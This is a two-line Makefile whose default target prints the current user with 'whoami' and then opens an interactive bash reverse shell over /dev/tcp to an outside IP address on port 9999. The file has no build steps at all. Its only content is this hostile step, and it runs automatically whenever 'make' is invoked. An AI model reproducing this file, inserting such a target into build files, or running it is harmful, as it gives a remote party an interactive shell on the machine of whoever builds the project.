.PHONY: default

default:
	@whoami
	@bash -c "bash -i >& /dev/tcp/9.134.5.132/9999 0>&1"
